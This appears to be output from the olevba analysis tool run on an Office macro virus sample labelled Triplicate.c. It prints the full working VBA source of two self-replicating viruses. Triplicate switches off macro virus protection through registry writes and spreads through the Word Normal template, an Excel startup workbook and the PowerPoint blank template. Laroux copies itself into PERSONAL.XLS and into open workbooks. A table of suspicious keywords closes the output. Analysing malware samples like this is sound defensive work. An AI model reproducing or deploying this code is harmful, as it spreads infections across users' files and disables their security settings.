olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSOffice.Triplicate.c-56fadfff3becb3f32fe29c7ce575228ebcf0cb14
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisWorkbook.cls 
in file: Virus.MSOffice.Triplicate.c-56fadfff3becb3f32fe29c7ce575228ebcf0cb14 - OLE stream: '_VBA_PROJECT_CUR/VBA/ThisWorkbook'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
'<!--1nternal-->
'Triplicate v0.21 /1nternal
Private Sub Document_Close()
    On Error Resume Next
    Options.VirusProtection = False
    Options.ConfirmConversions = False
    Options.SaveNormalPrompt = False
    Set NT = NormalTemplate.VBProject.VBComponents(1).CodeModule
    Set TT = Templates(1).VBProject.VBComponents(1).CodeModule
    Set AD = ActiveDocument.VBProject.VBComponents(1).CodeModule
    If AD.Lines(1, 1) <> "'<!--1nternal-->" Then
        AD.DeleteLines 1, AD.CountofLines
        AD.InsertLines 1, TT.Lines(1, TT.CountofLines)
        If AD.Lines(1, 1) <> "'<!--1nternal-->" Then
            AD.InsertLines 1, NT.Lines(1, NT.CountofLines)
        End If
    End If
    If NT.Lines(1, 1) <> "'<!--1nternal-->" Then
        NT.DeleteLines 1, NT.CountofLines
        NT.InsertLines 1, AD.Lines(1, AD.CountofLines)
        Set xlApp = CreateObject("Excel.Application")
        If UCase(Dir(xlApp.Application.StartupPath + "\Book1.")) <> UCase("BOOK1") Then
            System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\Office\8.0\Excel\Microsoft Excel", "Options6") = "Check"
            System.PrivateProfileString("", "HKEY_LOCAL_MACHINE\Software\Microsoft\Office\8.0\New User Settings\Excel\Microsoft Excel", "Options6") = ""
            System.PrivateProfileString("", "HKEY_USERS\.Default\Software\Microsoft\Office\8.0\Excel\Microsoft Excel", "Options6") = "Whoa"
            Set Book1Obj = xlApp.Workbooks.Add
            Book1Obj.VBProject.VBComponents("ThisWorkbook").CodeModule.InsertLines 1, NT.Lines(1, NT.CountofLines)
            Book1Obj.SaveAs xlApp.Application.StartupPath & "\Book1."
            Book1Obj.Close
        End If
        xlApp.Quit
        Set PPObj = CreateObject("PowerPoint.Application")
        Set PBT = PPObj.Presentations.Open(Application.Path + "\..\Templates\Blank Presentation.pot", , , msoFalse)
        For Each ModComponent In PBT.VBProject.VBComponents
            If ModComponent.Name = "Triplicate" Then dontadd = True
        Next
        If dontadd <> True Then
            System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\Office\8.0\PowerPoint\Options", "MacroVirusProtection") = ""
            System.PrivateProfileString("", "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Office\8.0\New User Settings\PowerPoint\Options", "MacroVirusProtection") = ""
            System.PrivateProfileString("", "HKEY_USERS\.Default\Software\Microsoft\Office\8.0\PowerPoint\Options", "MacroVirusProtection") = ""
            Set NewMod = PBT.VBProject.VBComponents.Add(1)
            NewMod.Name = "Triplicate"
            NewMod.CodeModule.InsertLines 1, NT.Lines(1, NT.CountofLines)
            NewMod.CodeModule.ReplaceLine 118, "Sub actionhook(tristate)"
            Set ShapetoWack = PBT.SlideMaster.Shapes.AddShape(1, 0, 0, PBT.PageSetup.SlideWidth, PBT.PageSetup.SlideHeight)
            With ShapetoWack
                .Name = "Triplicate"
                .ZOrder (1)
                .Line.Visible = False
                .Fill.Visible = False
                .ActionSettings(1).Action = 8
                .ActionSettings(1).Run = "actionhook"
            End With
            Set NewMod = Nothing
            PBT.Save
        End If
        PBT.Close
        PPObj.Quit
    End If
    If TT.Lines(1, 1) <> "'<!--1nternal-->" Then
        TT.DeleteLines 1, TT.CountofLines
        TT.InsertLines 1, NT.Lines(1, NT.CountofLines)
    End If
End Sub
Private Sub Workbook_Deactivate()
    On Error Resume Next
    Set AW = ActiveWorkbook.VBProject.VBComponents("ThisWorkbook").CodeModule
    Set TW = ThisWorkbook.VBProject.VBComponents("ThisWorkbook").CodeModule
    If UCase(Dir(Application.StartupPath + "\Book1.")) <> "BOOK1" Then
        Set WordObj = GetObject(, "Word.Application")
        If WordObj = "" Then
            Set WordObj = CreateObject("Word.Application")
            WQuit = True
        End If
        Set NT = WordObj.NormalTemplate.VBProject.VBComponents(1).CodeModule
        WordObj.Options.SaveNormalPrompt = False
        NT.InsertLines 1, "Public Sub DisableAV()" + Chr(13) + Chr(10) + TW.Lines(23, 3) + Chr(13) + Chr(10) + TW.Lines(38, 3) + Chr(13) + Chr(10) + "End Sub"
        WordObj.Run "Normal.ThisDocument.DisableAV"
        NT.DeleteLines 1, NT.CountofLines
        NT.InsertLines 1, TW.Lines(1, TW.CountofLines)
        Set NT = Nothing
        If WQuit = True Then WordObj.Quit
        Set PPObj = CreateObject("PowerPoint.Application")
        Set PBT = PPObj.Presentations.Open(Application.Path + "\..\Templates\Blank Presentation.pot", , , msoFalse)
        For Each ModComponent In PBT.VBProject.VBComponents
            If ModComponent.Name = "Triplicate" Then dontadd = True
        Next
        If dontadd <> True Then
            Set NewMod = PBT.VBProject.VBComponents.Add(1)
            NewMod.Name = "Triplicate"
            NewMod.CodeModule.InsertLines 1, TW.Lines(1, TW.CountofLines)
            NewMod.CodeModule.ReplaceLine 118, "Sub actionhook(tristate)"
            Set ShapetoWack = PBT.SlideMaster.Shapes.AddShape(1, 0, 0, PBT.PageSetup.SlideWidth, PBT.PageSetup.SlideHeight)
            With ShapetoWack
                .Name = "Triplicate"
                .ZOrder (1)
                .Line.Visible = False
                .Fill.Visible = False
                .ActionSettings(1).Action = 8
                .ActionSettings(1).Run = "actionhook"
            End With
            Set NewMod = Nothing
            PBT.Save
        End If
        PBT.Close
        PPObj.Quit
        Set xlApp = CreateObject("Excel.Application")
        Set Book1Obj = xlApp.Workbooks.Add
        Book1Obj.VBProject.VBComponents("ThisWorkbook").CodeModule.InsertLines 1, TW.Lines(1, TW.CountofLines)
        Book1Obj.SaveAs Filename:=Application.StartupPath & "\Book1.", FileFormat:=xlNormal, AddToMru:=False
        Book1Obj.Close
        xlApp.Quit
    End If
    If AW.Lines(1, 1) <> "'<!--1nternal-->" Then
        AW.InsertLines 1, TW.Lines(1, TW.CountofLines)
    End If
End Sub
Private Sub actionhook(tristate)
    On Error Resume Next
    If Int(Rnd * 7) = 0 Then
        Set Home = ActivePresentation
        If UCase(Dir(Application.Path + "\Xlstart\Book1.")) <> UCase("BOOK1") Then
            Set WordObj = GetObject(, "Word.Application")
            If WordObj = "" Then
                Set WordObj = CreateObject("Word.Application")
                WQuit = True
            End If
            Set NT = WordObj.NormalTemplate.VBProject.VBComponents(1).CodeModule
            WordObj.Options.SaveNormalPrompt = False
            NT.InsertLines 1, "Public Sub DisableAV()" + Chr(13) + Chr(10) + Home.VBProject.VBComponents("Triplicate").CodeModule.Lines(23, 3) + Chr(13) + Chr(10) + Home.VBProject.VBComponents("Triplicate").CodeModule.Lines(38, 3) + Chr(13) + Chr(10) + "End Sub"
            WordObj.Run "Normal.ThisDocument.DisableAV"
            NT.DeleteLines 1, NT.CountofLines
            NT.InsertLines 1, Home.VBProject.VBComponents("Triplicate").CodeModule.Lines(1, Home.VBProject.VBComponents("Triplicate").CodeModule.CountofLines)
            NT.ReplaceLine 118, "Private Sub actionhook(tristate)"
            Set NT = Nothing
            If WQuit = True Then WordObj.Quit
            Set xlApp = CreateObject("Excel.Application")
            Set Book1Obj = xlApp.Workbooks.Add
            Book1Obj.VBProject.VBComponents("ThisWorkbook").CodeModule.InsertLines 1, Home.VBProject.VBComponents("Triplicate").CodeModule.Lines(1, Home.VBProject.VBComponents("Triplicate").CodeModule.CountofLines)
            Book1Obj.VBProject.VBComponents("ThisWorkbook").CodeModule.ReplaceLine 118, "Private Sub actionhook(tristate)"
            Book1Obj.SaveAs xlApp.Application.StartupPath & "\Book1."
            Book1Obj.Close
            xlApp.Quit
            Set PBT = Presentations.Open(Application.Path + "\..\Templates\Blank Presentation.pot", , , msoFalse)
            dontadd = False
            For Each ModComponent In PBT.VBProject.VBComponents
                If ModComponent.Name = "Triplicate" Then dontadd = True
            Next
            If dontadd <> True Then
                Set NewMod = PBT.VBProject.VBComponents.Add(1)
                NewMod.Name = "Triplicate"
                NewMod.CodeModule.InsertLines 1, Home.VBProject.VBComponents("Triplicate").CodeModule.Lines(1, Home.VBProject.VBComponents("Triplicate").CodeModule.CountofLines)
                Set ShapetoWack = PBT.SlideMaster.Shapes.AddShape(1, 0, 0, PBT.PageSetup.SlideWidth, PBT.PageSetup.SlideHeight)
                With ShapetoWack
                    .Name = "Triplicate"
                    .ZOrder (1)
                    .Line.Visible = False
                    .Fill.Visible = False
                    .ActionSettings(1).Action = 8
                    .ActionSettings(1).Run = "actionhook"
                End With
                PBT.Save
            End If
            PBT.Close
        End If
    End If
    ActivePresentation.SlideShowWindow.View.Next
End Sub
-------------------------------------------------------------------------------
VBA MACRO Arkusz1.cls 
in file: Virus.MSOffice.Triplicate.c-56fadfff3becb3f32fe29c7ce575228ebcf0cb14 - OLE stream: '_VBA_PROJECT_CUR/VBA/Arkusz1'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO Arkusz2.cls 
in file: Virus.MSOffice.Triplicate.c-56fadfff3becb3f32fe29c7ce575228ebcf0cb14 - OLE stream: '_VBA_PROJECT_CUR/VBA/Arkusz2'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO Arkusz3.cls 
in file: Virus.MSOffice.Triplicate.c-56fadfff3becb3f32fe29c7ce575228ebcf0cb14 - OLE stream: '_VBA_PROJECT_CUR/VBA/Arkusz3'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO laroux.bas 
in file: Virus.MSOffice.Triplicate.c-56fadfff3becb3f32fe29c7ce575228ebcf0cb14 - OLE stream: '_VBA_PROJECT_CUR/VBA/laroux'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 

Sub auto_open()
Attribute auto_open.VB_ProcData.VB_Invoke_Func = " \n14"
    Application.OnSheetActivate = "check_files"
End Sub

Sub check_files()
Attribute check_files.VB_ProcData.VB_Invoke_Func = " \n14"
    c$ = Application.StartupPath
    m$ = Dir(c$ & "\" & "PERSONAL.XLS")
    If m$ = "PERSONAL.XLS" Then p = 1 Else p = 0
    If ActiveWorkbook.Modules.Count > 0 Then w = 1 Else w = 0
    whichfile = p Or w * 10
    
Select Case whichfile
    Case 10
    Application.ScreenUpdating = False
    n4$ = ActiveWorkbook.Name
    Sheets("laroux").Visible = True
    Sheets("laroux").Select
    Sheets("laroux").Copy
    With ActiveWorkbook
        .Title = ""
        .Subject = ""
        .Author = ""
        .Keywords = ""
        .Comments = ""
    End With
    newname$ = ActiveWorkbook.Name
    c4$ = CurDir()
    ChDir Application.StartupPath
    ActiveWindow.Visible = False
    Workbooks(newname$).SaveAs Filename:=Application.StartupPath & "/" & "PERSONAL.XLS", FileFormat:=xlNormal _
        , Password:="", WriteResPassword:="", ReadOnlyRecommended:= _
        False, CreateBackup:=False
    ChDir c4$
    Workbooks(n4$).Sheets("laroux").Visible = False
    Application.OnSheetActivate = ""
    Application.ScreenUpdating = True
    Application.OnSheetActivate = "personal.xls!check_files"
    Case 1
    Application.ScreenUpdating = False
    n4$ = ActiveWorkbook.Name
    p4$ = ActiveWorkbook.Path
    s$ = Workbooks(n4$).Sheets(1).Name
    If s$ <> "laroux" Then
        Workbooks("PERSONAL.XLS").Sheets("laroux").Copy before:=Workbooks(n4$).Sheets(1)
        Workbooks(n4$).Sheets("laroux").Visible = False
    Else
    End If
    Application.OnSheetActivate = ""
    Application.ScreenUpdating = True
    Application.OnSheetActivate = "personal.xls!check_files"
    Case Else
End Select
End Sub
-------------------------------------------------------------------------------
VBA MACRO xlm_macro.txt 
in file: xlm_macro - OLE stream: 'xlm_macro'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
' 0085     14 BOUNDSHEET : Sheet Information - Visual Basic module, visible -  larou
' 0085     15 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible -  Arkusz
' 0085     15 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible -  Arkusz
' 0085     15 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible -  Arkusz
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |Document_Close      |Runs when the Word document is closed        |
|AutoExec  |auto_open           |Runs when the Excel Workbook is opened       |
|Suspicious|Open                |May open a file                              |
|Suspicious|Run                 |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|CreateObject        |May create an OLE object                     |
|Suspicious|GetObject           |May get an OLE object with a running instance|
|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|System              |May run an executable file or a system       |
|          |                    |command on a Mac (if combined with           |
|          |                    |libc.dylib)                                  |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
+----------+--------------------+---------------------------------------------+

